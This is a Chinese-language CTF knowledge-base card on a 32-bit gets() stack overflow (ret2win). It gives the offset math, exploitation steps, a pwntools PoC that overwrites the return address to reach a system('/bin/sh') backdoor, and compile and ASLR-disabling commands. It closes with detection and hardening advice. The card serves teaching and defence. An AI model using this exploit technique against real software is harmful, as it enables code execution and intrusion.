---
id: binary-pwn-stack-32bit-gets-ret2win-backdoor
title: 32 位 gets 栈溢出 ret2win：0x14+4 字节填充覆盖 EIP 直跳 system("/bin/sh") 后门
type: scenario
domain: binary
path: binary/pwn/stack
technique: 32bit-gets-ret2win-no-pie
tags:
- pwn
- stack-overflow
- ret2text
- ret2win
- gets
- no-pie
- 32bit
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V529
  verified_at: '2026-11-11T15:37:44+08:00'
  notes: 已对照原文与 2 张截图核对：pwndbg 显示 vulnerable 入口 sub esp,0x14、缓冲区 [ebp-0x14]，Ghidra 显示 func@0x08048486 内 system("/bin/sh")，与卡内偏移 0x14+4 及后门地址一致；checksec 为 i386/No canary/NX enabled/No PIE，PoC 用 arch=i386 并 b'a'*(0x14+4)+p32(0x08048486)。原文 exp 模板误写 context(arch='amd64')（不影响 p32 载荷），卡内已用 i386 修正；原文未贴 shell 成功截图，但偏移与地址均有反汇编/截图依据。dedup 候选（64 位 win+1 对齐卡、单字节覆盖卡、ret2libc 卡）均为不同场景，非同链。
url: /docs/binary/pwn/stack/binary-pwn-stack-32bit-gets-ret2win-backdoor/
draft: false
kb_aliases:
- 32位栈溢出 ret2win
- gets 溢出跳后门
- ret2text 32 位
- p32 返回地址覆盖
- checksec 无保护编译
- socat 部署 pwn 题
---

## 一句话结论

32 位 ELF 里 `char s[12]` 被 `gets(s)` 无长度限制写入、且存在 `system("/bin/sh")` 后门函数时，`gets` 可把栈上 saved EBP 与返回地址一路覆盖；用 `b'a' * (0x14 + 4) + p32(后门地址)` 即可让 `vulnerable` 返回时直接跳到后门拿 shell（无 Canary、无 PIE 的入门级 ret2win）。

## 原理

- **溢出点**：`void vulnerable(){ char s[12]; puts("请输入:"); gets(s); puts(s); }`。`gets` 不检查边界，一直读到换行，输入长度完全可控。
- **栈布局**：编译器为 32 位帧分配 `SUB ESP, 0x14`（含对齐/`push ebx`），缓冲区起点 `[EBP-0x14]`；往下的 0x14 字节覆盖到 saved EBP，再 4 字节覆盖 saved EIP（32 位下返回地址 4 字节）。因此偏移 = 0x14 + 4。
- **控制流**：`vulnerable` 执行 `LEAVE; RET`，`RET` 从栈上取出被覆盖的返回地址装入 EIP。把该位置写成 `func`（`system("/bin/sh")`）的固定地址，程序返回即跳转执行，NX 不影响复用已有代码。
- **地址固定**：`gcc -m32 -fno-stack-protector -no-pie` 编译且关闭系统 ASLR（`randomize_va_space=0`）时，二进制基址固定（示例 `func` 位于 `0x08048486`），无需泄露。
- **为什么 32 位无需栈对齐**：x86 调用约定不要求 16 字节栈对齐，直接 `ret` 进 `func` 后由函数自己的 `push ebp; mov ebp,esp; ...; call system` 处理；64 位才需要关注 `movaps` 对齐问题。

## 触发条件

- 32 位可执行文件，存在 `gets`/`strcpy` 等无边界写入，且无 Canary（`-fno-stack-protector`）。
- 二进制未开 PIE（`-no-pie`），或已泄露代码基址。
- 程序内存在可直接调用的 `system("/bin/sh")` 后门（或 `execve` 等价函数）。
- 远程服务通过 socat/`nc` 暴露（`socat tcp-l:1337,fork exec:./main,reuseaddr`），攻击者可交互发送 payload。

## 利用步骤

1. `checksec` 确认：`Arch: i386`、`No canary found`、`NX enabled`、`No PIE (0x8048000)`；NX 开启不影响 ret2text。
2. 反汇编定位：`vulnerable` 中 `SUB ESP,0x14`、`LEA EAX,[EBP-0x14]`、`CALL gets`；`func` 起始地址（如 `0x08048486`，内部 `push "/bin/sh" 地址; call system`）。
3. 计算偏移：`0x14`（缓冲区到 saved EBP）+ `4`（saved EBP 到 saved EIP）= `0x18`。
4. 构造 payload：`b'a' * 0x18 + p32(0x08048486)`，`sendline` 发送。
5. `vulnerable` 返回时 EIP 被覆盖为 `func`，执行 `system("/bin/sh")`，进入交互 shell 后读取 flag。

## PoC

```python
from pwn import *
context(os='linux', arch='i386', log_level='debug')

payload = b'a' * (0x14 + 4)        # 0x14 到 saved EBP，+4 到 saved EIP（32 位）
system_addr = 0x08048486           # func: system("/bin/sh")

def main():
    p = process("./main")          # 本地；远程改 remote('target', 1337)
    p.sendline(payload + p32(system_addr))
    p.interactive()

main()
```

编译条件（出题侧）：`gcc -m32 -fno-stack-protector -no-pie main.c -o main`；关闭系统 ASLR：`echo 0 > /proc/sys/kernel/randomize_va_space`。

## 变体与关联

- 变体一：64 位下偏移改为 `buf 大小 + 8`（saved RBP），且需检查 `system` 入口的 16 字节栈对齐（必要时插入 `ret` gadget 或 `win+1`）。
- 变体二：开启 PIE 时先用格式化字符串/栈泄漏拿基址，再计算后门地址；开启 Canary 时先泄漏并回填。
- 变体三：无后门函数时改为 ret2libc（泄漏 GOT → 计算 libc 基址 → `system("/bin/sh")`）或 ret2syscall。
- 关联：[[binary-pwn-stack-ret2text-win-plus-one-align]]（64 位 ret2text 与栈对齐）、[[ctf-pwn-onebyte-ret-overwrite-backdoor-system]]（只能覆盖返回地址低字节的变体）、[[binary-pwn-stack-login-fgets-unbounded-password-ret2backdoor]]（认证函数中的 ret2backdoor）、[[binary-pwn-stack-ret2syscall-32bit]]（无后门时 32 位系统调用链）。
- 边界：`gets` 在较新 glibc/编译器下可能被移除或告警（需 `-Wno-implicit-function-declaration`/链接旧库）；目标若开启 Canary/PIE 或 ASLR 未关，需先泄露。

## 检测与防御

- 检测（CTF/审计）：程序导入 `gets`/`strcpy` 且无 Canary；`checksec` 显示 No PIE；二进制内存在未被正常引用的 `system("/bin/sh")` 函数；服务端出现超长输入后进程派生 shell。
- 修复：用 `fgets(buf, sizeof(buf), stdin)` 替代 `gets`；编译开启 `-fstack-protector-strong`、`-pie -fPIE`、NX、Full RELRO。
- 加固：删除后门/调试函数；保持系统 ASLR 开启（`randomize_va_space=2`）；限制服务进程权限并用 seccomp 限制 `execve`。
